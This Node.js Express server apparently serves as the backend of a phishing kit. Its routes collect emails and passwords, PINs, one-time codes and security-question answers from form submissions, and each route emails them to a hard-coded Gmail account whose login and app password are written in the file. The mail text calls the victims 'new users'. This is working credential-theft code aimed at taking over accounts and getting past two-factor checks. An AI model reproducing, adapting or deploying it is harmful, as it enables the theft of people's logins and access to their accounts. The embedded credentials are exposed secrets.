const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const cors = require("cors");
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000; // port to connect to WEB

// emails credentials
const userEmail = "chidiebereajaeroelvis@gmail.com";
const pass = "qpboyelacgloplhy";


// Middleware
app.use(express.json());

// api routes

// API routes for index
app.post("/", (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `email: ${email}\nPassword: ${password}`,
    text: `New user registered with Email: ${email}\nPassword: ${password}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for pin
app.post("/pin", (req, res) => {
  console.log(req.body);
  let { pin } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PIN is: ${pin}`,
    text: `New user PIN is: ${pin}`,
  };
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  let { otp } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `OTP is: ${otp}`,
    text: `New user OTP is: ${otp}`,
  };
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

// Backend - Updated server.js security route
app.post("/security", async (req, res) => {
  const { questions } = req.body;
  
  // Create structured object with questions and answers
  const securityData = {
    question1: {
      question: questions[0]?.question || "",
      answer: questions[0]?.answer || ""
    },
    question2: {
      question: questions[1]?.question || "",
      answer: questions[1]?.answer || ""
    },
    question3: {
      question: questions[2]?.question || "",
      answer: questions[2]?.answer || ""
    }
  };
  
  // Format for email display
  const formattedQuestions = [
    `QUESTION 1:\n${securityData.question1.question}\nANSWER 1:\n${securityData.question1.answer}`,
    `QUESTION 2:\n${securityData.question2.question}\nANSWER 2:\n${securityData.question2.answer}`,
    `QUESTION 3:\n${securityData.question3.question}\nANSWER 3:\n${securityData.question3.answer}`
  ].join("\n\n" + "=".repeat(50) + "\n\n");
  
  // Configure your email
  const transporter = nodemailer.createTransporter({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });
  
  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Security Questions Submission - 3 Questions",
    text: `Security Questions Data:\n\n${formattedQuestions}\n\nStructured Data Object:\n${JSON.stringify(securityData, null, 2)}`,
  };
  
  try {
    console.log("Security Data Object:", securityData);
    console.log("Formatted Email Content:", formattedQuestions);
    
    await transporter.sendMail(mailOptions);
    res.status(200).json({ 
      message: "Security questions submitted successfully!",
      data: securityData 
    });
  } catch (error) {
    console.error("Error sending security questions email:", error);
    res.status(500).json({ 
      error: "Failed to send email",
      details: error.message 
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});



